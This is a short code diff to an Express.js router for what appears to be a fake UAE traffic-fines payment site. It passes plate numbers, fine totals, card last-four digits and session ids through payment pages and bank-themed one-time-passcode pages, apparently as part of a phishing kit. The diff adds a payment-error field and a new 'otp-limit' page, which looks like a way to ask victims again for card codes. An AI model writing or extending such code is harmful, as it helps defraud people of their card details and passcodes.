@@ -33,13 +33,14 @@ router.get('/fines', async (req, res) => {
 
 router.get('/payment', async (req, res) => {
   const pixel = await getPixelData();
-  const { plateNo='', plateSrcCode='', plateCodeLetter='', totalFine='0', fineCount='0' } = req.query;
+  const { plateNo='', plateSrcCode='', plateCodeLetter='', totalFine='0', fineCount='0', error='' } = req.query;
   res.render('payment', {
     ...pixel, pixelCurrentPath: '/payment',
     plateNo, plateSrcCode, plateCodeLetter,
     totalFine:  parseInt(totalFine)  || 0,
     fineCount:  parseInt(fineCount)  || 0,
     emirateName: EMIRATE_NAMES[plateSrcCode] || plateSrcCode,
+    paymentError: error,
   });
 });
 
@@ -105,6 +106,12 @@ router.get('/otp-citi', async (req, res) => {
   const pixel = await getPixelData();
   const { totalFine='0', cardLast4='****', issuer='Citi', sid='' } = req.query;
   res.render('otp-citi', { ...pixel, pixelCurrentPath: '/otp-citi', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
+});
+
+router.get('/otp-limit', async (req, res) => {
+  const pixel = await getPixelData();
+  const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
+  res.render('otp-limit', { ...pixel, pixelCurrentPath: '/otp-limit', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
 });
 
 router.get('/otp-approved', async (req, res) => {
